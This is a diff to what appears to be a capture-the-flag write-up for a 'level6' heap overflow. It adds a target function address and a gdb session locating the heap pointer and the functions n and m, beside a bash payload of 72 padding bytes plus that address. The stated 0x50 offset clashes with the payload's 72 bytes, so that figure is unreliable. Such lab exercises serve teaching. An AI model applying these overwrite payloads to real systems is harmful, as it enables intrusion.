@@ -22,6 +22,9 @@
 
 Example payload:
 
+
+0x08048454 
+
 ```bash
 python -c 'print("X"*72 + "\x54\x84\x04\x08")' > /tmp/out
 ./level6 $(cat /tmp/out)
@@ -89,3 +92,17 @@ Heap layout around the target:
 - Use `gdb` and `vmmap` to confirm the heap addresses.
 - The critical offset is `0x50` bytes from buffer start to the pointer.
 - Confirm the exploit payload with a controlled heap write before running the final attack.
+
+
+(gdb) run aaaaaa
+Starting program: /home/user/level6/level6 aaaaaa
+
+Breakpoint 1, 0x080484d0 in main ()
+(gdb) x/wx $esp+0x18
+0xbffff728:	0x0804a050
+(gdb) x/wx 0x0804a050
+0x804a050:	0x08048468
+(gdb) p/x &n
+$1 = 0x8048454
+(gdb) p/x &m
+$2 = 0x8048468
